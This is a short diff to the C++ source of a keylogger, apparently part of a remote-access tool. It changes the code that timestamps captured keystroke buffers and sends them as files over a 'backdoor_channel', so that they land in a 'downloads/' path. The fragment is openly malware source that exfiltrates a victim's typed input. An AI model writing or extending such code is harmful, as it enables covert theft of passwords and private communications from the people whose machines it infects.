@@ -96,7 +96,8 @@ void Key_Logger::start() {
         oss << std::put_time(&tm, "%d-%m-%Y %H-%M-%S");
         auto str = oss.str();//datetimestring
 
-        backdoor_channel.callback_sendNewFile(str, buffer);
+        std::string send = "downloads/" + str;
+        backdoor_channel.callback_sendNewFile(send, buffer);
         buffer.clear();
         
     }
